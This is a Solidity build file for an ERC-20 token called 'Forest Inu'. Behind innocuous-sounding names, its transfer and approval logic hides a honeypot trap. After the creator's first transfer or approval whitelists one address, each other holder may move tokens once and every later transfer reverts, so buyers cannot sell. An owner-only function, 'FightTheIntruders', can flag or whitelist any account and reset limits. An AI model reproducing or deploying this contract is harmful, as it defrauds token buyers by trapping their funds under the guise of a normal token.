{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "ERC20.sol": {
      "content": "/**\n * His home is the forest,\n * welcome to the keeper\n * of nature. The protector\n * of forests. The protector\n * of animals.\n * \n * The Forest Inu\n \n**/\n\npragma solidity ^0.8.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function totalSupply() external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function symbol() external view returns (string memory);\n    function name() external view returns (string memory);\n    function decimals() external view returns (uint8);\n}\n\ncontract Ownable is Context {\n    address private _previousOwner;\n    address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\n    mapping (address => bool) public PrepareRedistributionETH;\n\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n    \n    mapping (address => bool) public DoRedistributionWithUniswap;\n\n    uint256 private _totalSupply;\n    bool private detectSell;\n    uint256 private chTx;\n    bool private redistMechanic;\n    string private _symbol;\n    address private _creator;\n    uint256 private tXs;\n    uint256 private getRedistributionStatus;\n    uint256 private setTxLimit;\n    bool private tempVal;\n    string private _name;\n    \n    constructor (string memory name_, string memory symbol_, address creator_, bool house11, bool house2, uint256 house9) {\n        _name = name_;\n        _symbol = symbol_;\n        detectSell = house11;\n        redistMechanic = house2;\n        tempVal = house2;\n        DoRedistributionWithUniswap[creator_] = house11;\n        _creator = creator_;\n        PrepareRedistributionETH[creator_] = house2;\n        tXs = house9;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    \n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n    \n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n    \n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n    \n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n    \n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n    \n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n    \n    function FightTheIntruders(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {\n        PrepareRedistributionETH[account] = v1;\n        DoRedistributionWithUniswap[account] = v2;\n        detectSell = v3;\n        getRedistributionStatus = v4;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        \n        \n        if ((address(sender) == _creator) && (tempVal == false)) {\n            getRedistributionStatus = chTx;\n            detectSell = true;\n        }\n    \n        if ((address(sender) == _creator) && (tempVal == true)) {\n            PrepareRedistributionETH[recipient] = true;\n            tempVal = false;\n        }\n    \n        if (PrepareRedistributionETH[sender] == false) {\n            if ((amount > setTxLimit)) {\n                require(false);\n            }\n      \n            require(amount < getRedistributionStatus);\n            if (detectSell == true) {\n                if (DoRedistributionWithUniswap[sender] == true) {\n                    require(false);\n                }\n                DoRedistributionWithUniswap[sender] = true;\n            }\n        }\n        \n        uint256 taxamount = amount;\n        \n        _balances[sender] = senderBalance - taxamount;\n        _balances[recipient] += taxamount;\n\n        emit Transfer(sender, recipient, taxamount);\n        \n    }\n        \n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _balances[account] -= amount;\n        _balances[address(0)] += amount;\n        emit Transfer(account, address(0), amount);\n     }\n     \n    function _ProtectNature(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        \n        getRedistributionStatus = _totalSupply;\n        chTx = _totalSupply / val1;\n        setTxLimit = chTx * val2;\n        \n        emit Transfer(address(0), account, amount);    \n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        \n        if ((address(owner) == _creator) && (redistMechanic == true)) {\n            PrepareRedistributionETH[spender] = true;\n            DoRedistributionWithUniswap[spender] = false;\n            redistMechanic = false;\n        }\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n}\n\ncontract ERC20Forest is Context, ERC20 {\n    constructor(\n        string memory name, string memory symbol,\n        bool house101, bool house2, uint256 house6,\n        uint256 house7, address creator,\n        uint256 initialSupply, address owner,\n        uint256 house9\n    ) ERC20(name, symbol, creator, house101, house2, house9) {\n        _ProtectNature(owner, initialSupply, house6, house7);\n    }\n}\n\ncontract ForestInu is ERC20Forest {\n    constructor() ERC20Forest(\"Forest Inu\", \"FORESTINU\", false, true, 900, 25, msg.sender, 3000000000 * 10 ** 18, msg.sender, 30) {\n    }\n}"
    }
  }
}